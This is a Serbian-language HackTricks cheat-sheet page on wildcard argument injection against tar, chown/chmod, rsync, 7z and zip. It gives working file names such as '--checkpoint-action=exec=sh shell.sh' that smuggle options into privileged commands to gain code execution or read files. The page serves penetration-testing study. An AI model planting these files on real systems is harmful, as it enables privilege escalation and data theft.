{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


## chown, chmod

Možete **naznačiti koji vlasnik datoteke i dozvole želite da kopirate za ostale datoteke**
```bash
touch "--reference=/my/own/path/filename"
```
Možete iskoristiti ovo koristeći [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(kombinovani napad)_\
Više informacija na [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Tar

**Izvršite proizvoljne komande:**
```bash
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Možete iskoristiti ovo koristeći [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(tar napad)_\
Više informacija na [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## Rsync

**Izvršite proizvoljne komande:**
```bash
Interesting rsync option from manual:

-e, --rsh=COMMAND           specify the remote shell to use
--rsync-path=PROGRAM    specify the rsync to run on remote machine
```

```bash
touch "-e sh shell.sh"
```
Možete iskoristiti ovo koristeći [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(_rsync _napad)_\
Više informacija na [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

## 7z

U **7z** čak i korišćenjem `--` pre `*` (napomena da `--` znači da sledeći unos ne može biti tretiran kao parametri, tako da su u ovom slučaju samo putanje do datoteka) možete izazvati proizvoljnu grešku da pročitate datoteku, tako da ako se komanda poput sledeće izvršava od strane root-a:
```bash
7za a /backup/$filename.zip -t7z -snl -p$pass -- *
```
I možete kreirati fajlove u folderu gde se ovo izvršava, mogli biste kreirati fajl `@root.txt` i fajl `root.txt` koji je **symlink** ka fajlu koji želite da pročitate:
```bash
cd /path/to/7z/acting/folder
touch @root.txt
ln -s /file/you/want/to/read root.txt
```
Zatim, kada se **7z** izvrši, tretiraće `root.txt` kao datoteku koja sadrži listu datoteka koje treba da kompresuje (to je ono što postojanje `@root.txt` ukazuje) i kada 7z pročita `root.txt`, pročitaće `/file/you/want/to/read` i **pošto sadržaj ove datoteke nije lista datoteka, prikazaće grešku** koja prikazuje sadržaj.

_Više informacija u Write-ups of the box CTF from HackTheBox._

## Zip

**Izvršavanje proizvoljnih komandi:**
```bash
zip name.zip files -T --unzip-command "sh -c whoami"
```
{% hint style="success" %}
Učite i vežbajte AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Učite i vežbajte GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podržite HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili **pratite** nas na **Twitteru** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakerske trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
